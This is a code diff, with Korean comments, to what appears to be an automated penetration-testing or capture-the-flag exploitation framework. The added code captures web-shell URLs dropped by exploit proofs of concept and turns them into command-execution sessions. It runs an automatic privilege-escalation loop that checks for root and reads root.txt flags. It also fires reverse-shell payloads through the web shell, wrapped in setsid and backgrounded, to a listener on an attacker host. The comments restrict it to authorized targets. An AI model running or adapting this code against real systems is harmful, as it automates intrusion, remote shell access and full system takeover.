@@ -52,10 +52,34 @@ class FootholdMixin:
                 return
             before = len(report.enum_findings)
             self._attempt(report, report.enum_findings, poc, phase="access")
-            from .exploit_run import harvest_creds
+            from .exploit_run import harvest_creds, harvest_foothold
+            mod = getattr(self, "_active_exploit_module", None)
             for f in report.enum_findings[before:]:
-                for u, p in harvest_creds(f.output or ""):
+                out = f.output or ""
+                for u, p in harvest_creds(out):
                     self.world.add_cred(f"{u}:{p}", source="PoC 출력")
+                # 발판 아티팩트 캡처: PoC 가 드롭한 웹셸 URL 을 잡아 웹 RCE 발판으로 잇는다.
+                # (한 번 잡으면 유지 — 이후 _acquire_web_rce 가 이 URL/스펙으로 세션 획득.)
+                if not getattr(self, "rce_url", ""):
+                    url = harvest_foothold(out, mod)
+                    if url:
+                        self._set_web_rce_from_capture(url, mod, report)
+
+    def _set_web_rce_from_capture(self, url, module, report):
+        """캡처한 웹셸 URL 로 웹 RCE 발판 스펙을 세팅한다(생성 전용 — 세션 획득은 _acquire_web_rce).
+        모듈이 있으면 그 cmd 스펙(param/method/inject)을, 없으면 보수적 기본(cmd/GET/query)을 쓴다."""
+        self.rce_url = url
+        if module is not None:
+            self.rce_cmd_param = module.cmd_param
+            self.rce_method = module.cmd_method
+            self.rce_inject = module.cmd_inject
+        else:
+            self.rce_cmd_param, self.rce_method, self.rce_inject = "cmd", "GET", "query"
+        self.audit.event("foothold_url_captured", url=url,
+                         via=(module.cve if module is not None else "generic"))
+        report.manual_suggestions.append(
+            f"# 웹 RCE 발판 캡처 — PoC 출력에서 웹셸 URL 확보: {url} "
+            f"(cmd 파라미터='{self.rce_cmd_param}', {self.rce_method}). 이 채널로 명령 실행·플래그 읽기.")
 
     def _exploit_exec_stage(self, report, host):
         if not self.exploit_exec or self.world is None or self.dry_run:
@@ -146,8 +170,64 @@ class FootholdMixin:
                 prov = _prov.FlagProvenance(kind, val, "<발판 세션 직독>", "foothold",
                                             "exploit-derived", "발판 세션에서 직접 읽음")
                 self._record_flag(report, FlagHit(val, kind, "발판"), prov)
+            # 권한상승 폐루프(발판 세션 위) — SSH 전용이던 폐루프를 '획득한 발판 세션'에도 적용해
+            # 일반화(웹/리버스셸 발판 포함). 열거→랭킹→HIGH 벡터 실행→uid=0→root.txt.
+            self._privesc_loop(session, report)
         except OSError as e:   # 세션 소켓/전송 오류 → 발판 중단(이후 준비 스테이지는 계속)
             self.audit.event("foothold_session_error", error=f"{type(e).__name__}: {e}")
+
+    def _privesc_loop(self, session, report) -> None:
+        """획득한 발판 세션 위에서 권한상승을 자동 시도한다(생성→실행 폐루프, 세션 무관).
+
+        ① privesc 열거(PRIVESC_ENUM) 실행 → 출력 코퍼스 ② privesc_analyze 로 HIGH 벡터 랭킹
+        ③ 상위 벡터의 비대화형(one-shot) 상승을 실행해 uid=0 확인 ④ 성립 시 world 를 root 로
+        전이하고 /root/root.txt 를 읽어 플래그 기록. 어떤 단계든 미성립/실패면 조용히 종료
+        (발판·user 플래그는 유지). _exploit_exec_stage(SSH)와 동일 로직의 '세션 무관' 버전 —
+        이전엔 SSH 발판에만 폐루프가 걸려, 웹셸/리버스셸로 들어온 박스는 privesc 가 수동이었다.
+        실행은 '이미 획득한 셸' 위에서만 일어난다(새 범위 밖 대상 접촉 없음). 인가 대상 전용."""
+        if self.world is None or self.world.has_access("root"):
+            return
+        from .orchestrator import EnumFinding
+        from .privesc_analyze import analyze_enum
+        from .target_shell import PRIVESC_ENUM
+        try:
+            # ① 열거 — 코퍼스에 반영(벡터 랭킹 재료)
+            for rc in PRIVESC_ENUM:
+                if self._goal_reached(report) or self._time_up():
+                    return
+                out = session.run(rc)
+                report.enum_findings.append(
+                    EnumFinding(command=f"[발판 privesc 열거] {rc}", phase="privesc",
+                                output=out, ran=True))
+            # ② 랭킹(HIGH 벡터만)
+            corpus = "\n".join(f.output for f in report.enum_findings if f.output)
+            vectors = [v for v in analyze_enum(corpus) if v.confidence == "high"]
+            # ③ HIGH 벡터 실행 — 비대화형(one-shot) 우선(프레이밍 채널에서 대화형 셸 스폰 회피)
+            for v in vectors[:3]:
+                if self._goal_reached(report) or self._time_up():
+                    return
+                probe = v.oneshot("id") or ((v.plan.splitlines()[0] + "; id") if v.plan else "")
+                if not probe:
+                    continue
+                out = session.run(probe)
+                report.enum_findings.append(
+                    EnumFinding(command=f"[발판 privesc 시도] {v.kind}:{v.binary}",
+                                phase="privesc", output=out, ran=True))
+                if "uid=0(root)" in out:
+                    self.world.raise_access("root")
+                    self.audit.event("privesc_root", via=v.kind, binary=v.binary,
+                                     channel=getattr(session, "kind", "?"))
+                    # ④ root 전이 후 플래그 재읽기(세션 직독, provenance=privesc)
+                    from . import flag_read
+                    for kind, val in flag_read.read_flags(
+                            session, flag_kind=self.flag_kind).items():
+                        prov = _prov.FlagProvenance(kind, val, "<발판 privesc 후 직독>", "privesc",
+                                                    "exploit-derived",
+                                                    "권한상승 후 발판 세션에서 직접 읽음")
+                        self._record_flag(report, FlagHit(val, kind, "privesc"), prov)
+                    return
+        except OSError as e:   # 세션 소켓/전송 오류 → privesc 중단(발판·user 플래그 유지)
+            self.audit.event("privesc_session_error", error=f"{type(e).__name__}: {e}")
 
     def _acquire_session(self, report, host):
         """발판 세션 획득 + 성립 검증. --exploit-exec/--auto-poc 전용(RCE 실행 표면).
@@ -161,7 +241,12 @@ class FootholdMixin:
         if self.world.web_product:
             ws = self._acquire_web_rce(report, looks_like_shell, verify_probe_command)
             if ws is not None:
-                return ws
+                # 웹 RCE 확보 시, opt-in(catch_revshell) + 공격자 IP 가 있으면 '리버스셸 업그레이드'
+                # 를 시도한다 — 웹셸로 리버스셸 payload 를 쏘고(nc 리스너로 수신), 성립하면 더
+                # 안정적인 셸 세션을 우선한다(privesc 열거에 유리). 실패하면 웹 세션 유지(무손실).
+                upgraded = self._maybe_upgrade_revshell(report, ws,
+                                                        looks_like_shell, verify_probe_command)
+                return upgraded if upgraded is not None else ws
         # (2) 리버스셸 수신 분기 — opt-in(catch_revshell) + 준비된 revshell(lhost/lport) 있을 때
         return self._acquire_reverse_shell(report, looks_like_shell, verify_probe_command)
 
@@ -178,7 +263,11 @@ class FootholdMixin:
                 "발판 미확보로 안전하게 건너뜀(실행 크래시 아님).")
             return None
         url = getattr(self, "rce_url", None) or f"https://{self.world.target}/admin/config.php"
-        ws = WebRceSession(url, "cmd", method="POST", inject="body")
+        # 캡처된 발판이면 그 cmd 스펙(param/method/inject)을 쓰고, 아니면 보수적 기본(POST/body).
+        param = getattr(self, "rce_cmd_param", "") or "cmd"
+        method = getattr(self, "rce_method", "") or "POST"
+        inject = getattr(self, "rce_inject", "") or "body"
+        ws = WebRceSession(url, param, method=method, inject=inject)
         ws.attach(web_http_fn)                       # ← 실제 HTTP (표면)
         # ★ 성립 검증: id/uname 신호가 없으면 헛발판 → 폐기(거짓 '발판 확보' 방지). HTTP 요청
         # 자체가 런타임에 실패(연결거부·타임아웃·TLS)하면 '발판 미확보'로 degrade 해 None 을
@@ -239,3 +328,99 @@ class FootholdMixin:
             return session
         session.close()
         return None
+
+    # ── 리버스셸 업그레이드(웹 RCE → nc 수신 셸) ─────────────────────────────
+    def _pick_revshell_payload(self, report) -> str:
+        """준비된 리버스셸 payload(report.revshells = revshell.generate)에서 '한 줄'을 고른다.
+        TTY 없는 웹셸에서 가장 잘 도는 순서로 선호(bash 계열 → mkfifo → python3). 없으면 ''."""
+        shells = getattr(report, "revshells", None) or []
+        by_name = {getattr(s, "name", ""): getattr(s, "payload", "") for s in shells}
+        for n in ("bash 5", "bash -i", "sh mkfifo", "nc mkfifo", "python3", "perl"):
+            if by_name.get(n):
+                return by_name[n]
+        return (getattr(shells[0], "payload", "") if shells else "")
+
+    def _fire_web_payload(self, web_session, payload: str) -> None:
+        """웹 RCE 채널로 리버스셸 트리거를 '쏜다'(fire-and-forget, 백그라운드 스레드).
+        payload 를 백그라운드·세션분리로 감싸 HTTP 요청이 셸에 매달리지 않게 한다. 실패는 삼킨다
+        (성립 판정은 리스너 수신이 담당). WebRceSession.fire 가 요청 오류를 degrade 처리한다."""
+        import shlex
+        import threading
+        # setsid + 백그라운드 + 입출력 분리 → PHP system() 류가 자식에 매달리지 않고 즉시 반환.
+        bg = f"setsid sh -c {shlex.quote(payload)} >/dev/null 2>&1 &"
+        fire = getattr(web_session, "fire", None)
+        if fire is None:
+            return
+
+        def _send():
+            try:
+                fire(bg)
+            except Exception as e:   # noqa: BLE001 — fire-and-forget
+                self.audit.event("revshell_fire_error", error=f"{type(e).__name__}: {e}")
+
+        threading.Thread(target=_send, daemon=True).start()
+
+    def _maybe_upgrade_revshell(self, report, web_session, looks_like_shell, verify_probe_command):
+        """웹 RCE 발판을 리버스셸로 '업그레이드'한다(opt-in·공격자 IP 필요). 리스너를 백그라운드로
+        띄우고 웹셸로 payload 를 쏜 뒤 콜백을 수신한다. 성립검증 통과분만 인정하고, 성공 시 웹
+        세션을 닫고 리버스셸 세션을 반환(더 안정적). 어떤 단계든 실패하면 None(→ 웹 세션 유지, 무손실).
+        한 세션 1회만 시도(재진입 가드). 전부 opt-in(catch_revshell) + 준비된 revshell 하에서만."""
+        if not getattr(self, "catch_revshell", False):
+            return None
+        if getattr(self, "_revshell_upgraded", False):
+            return None
+        lhost = getattr(report, "revshell_lhost", "") or ""
+        lport = getattr(report, "revshell_lport", 0) or getattr(self, "revshell_port", 0)
+        if not lhost or not lport:
+            return None
+        payload = self._pick_revshell_payload(report)
+        if not payload:
+            return None
+        catch = getattr(self, "_revshell_catcher", None)   # 테스트 주입용(기본은 실제 소켓)
+        if catch is None:
+            try:
+                from .shell_transport import catch_reverse_shell as catch
+            except ImportError as e:
+                self.audit.event("foothold_skip", reason="revshell_transport_unavailable",
+                                 detail=str(e))
+                return None
+        self._revshell_upgraded = True
+        import threading
+        import time
+        result: dict = {}
+
+        def _listen():
+            try:
+                result["sess"] = catch(lhost, int(lport))
+            except OSError as e:
+                result["err"] = e
+
+        th = threading.Thread(target=_listen, daemon=True)
+        self.audit.event("revshell_listen", lhost=lhost, lport=int(lport), via="web-upgrade")
+        th.start()
+        # 리스너가 bind/accept 준비할 짧은 여유(테스트는 0). 그 뒤 트리거 발사.
+        time.sleep(getattr(self, "_revshell_prefire_delay", 0.5))
+        self._fire_web_payload(web_session, payload)
+        th.join(timeout=getattr(self, "_revshell_join_timeout", 125))
+        session = result.get("sess")
+        if session is None:
+            return None
+        # 성립 검증: 콜백이 와도 실제 셸 신호가 없으면 폐기(거짓 발판 방지). 소켓 I/O 오류도 degrade.
+        try:
+            ok = bool(session.alive and looks_like_shell(session.run(verify_probe_command())))
+        except OSError as e:
+            self.audit.event("revshell_catch_error", error=f"{type(e).__name__}: {e}")
+            session.close()
+            return None
+        if not ok:
+            session.close()
+            return None
+        self.audit.event("revshell_upgrade", lhost=lhost, lport=int(lport))
+        report.manual_suggestions.append(
+            f"# 웹 RCE → 리버스셸 업그레이드 성립 — nc 리스너({lhost}:{lport}) 수신 셸 확보. "
+            f"이후 명령·privesc 열거는 리버스셸 세션으로 진행(더 안정적).")
+        try:
+            web_session.close()
+        except Exception:   # noqa: BLE001 — 업그레이드 성공이 웹 세션 close 예외로 깨지지 않게
+            pass
+        return session
